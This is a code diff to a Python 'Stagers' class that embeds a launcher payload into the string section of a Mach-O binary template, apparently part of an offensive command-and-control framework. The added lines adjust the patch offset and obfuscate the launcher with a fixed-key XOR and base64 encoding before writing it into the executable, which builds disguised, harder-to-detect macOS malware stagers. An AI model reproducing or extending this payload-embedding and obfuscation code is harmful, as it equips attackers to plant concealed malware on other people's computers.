@@ -22,6 +22,8 @@ import macholib.MachO
 import shutil
 import zipfile
 import subprocess
+from itertools import izip, cycle
+import base64
 
 
 class Stagers:
@@ -146,14 +148,17 @@ class Stagers:
                     count += 1
                     for section in cmd[count]:
                         if section.sectname.strip('\x00') == '__cstring':
-                            offset = int(section.offset)
-                            placeHolderSz = int(section.size) - 13
+                            offset = int(section.offset) + (int(section.size) - 2119)
+                            placeHolderSz = int(section.size) - (int(section.size) - 2119)
 
         template = f.read()
         f.close()
 
         if placeHolderSz and offset:
 
+            key = 'subF'
+            launcherCode = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(launcherCode, cycle(key)))
+            launcherCode = base64.urlsafe_b64encode(launcherCode)
             launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
             patchedMachO = template[:offset]+launcher+template[(offset+len(launcher)):]
 
